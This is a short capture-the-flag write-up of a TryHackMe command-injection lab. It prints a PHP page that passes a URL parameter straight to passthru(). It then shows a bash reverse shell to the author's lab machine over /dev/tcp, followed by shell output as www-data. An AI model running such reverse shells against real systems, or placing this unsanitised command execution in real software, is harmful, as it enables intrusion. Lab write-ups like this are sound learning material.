A very interesting one goes here. The server started on http://10.10.22.242/
I start off by doing a directory bruteforce : 
└─# gobuster dir -u http://10.10.22.242/ -w /usr/share/wordlists/directory-list-2.3-medium.txt -e php -z
There is a PHP script here -> http://10.10.22.242/evilshell.php. It utilizes the php passthru() function which is allowing commands to run and echoes back the result
on the browser. The code here, obtained after I spawned a shell 

<?php

                    if (isset($_GET["commandString"])) {
                        $command_string = $_GET["commandString"];
                        
                        try {
                            passthru($command_string);
                        } catch (Error $error) {
                            echo "<p class=mt-3><b>$error</b></p>";
                        }
                    }
                        
                ?>


And so am tempted to try a reverse shell command here.
bash -c 'bash -i >& /dev/tcp/10.9.0.177/9001 0>&1'

and boom we I have spawned a session as www-data

www-data@injection:/var/www/html$ whoami
whoami
www-data
www-data@injection:/var/www/html$ ls
ls
css
drpepper.txt
evilshell.php
index.php
js
www-data@injection:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

I want to know more, what does the drpepper.txt contain?
www-data@injection:/var/www/html$ cat drpepper.txt
cat drpepper.txt
I love Dr Pepper

That may become useful later. For now, let me go /home
There is no logon users so the box is just designed to learn command injection. So below I focus on the quizzes.

This was a good refresher and absolute fun! Thanks to TryHackMe
